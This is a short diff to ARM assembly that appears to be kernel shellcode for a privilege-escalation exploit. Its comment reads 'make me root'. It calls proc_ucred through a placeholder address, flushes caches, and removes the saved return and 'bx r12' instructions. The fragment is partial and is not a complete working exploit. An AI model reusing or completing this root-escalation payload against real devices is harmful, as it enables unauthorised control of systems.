@@ -2,7 +2,6 @@
 .globl start
 start:
     # make me root
-    mov r12, lr
     ldr r3, proc_ucred
     blx r3
     mov r1, #0
@@ -48,8 +47,7 @@ inval_loop:
 pf_done:
     mcr p15, 0, r0, c7, c5, 6 
 
-    mov r0, #0
-    bx r12
+    # return to userland
 
 .align 2
 proc_ucred: .long 0xdeadbeef
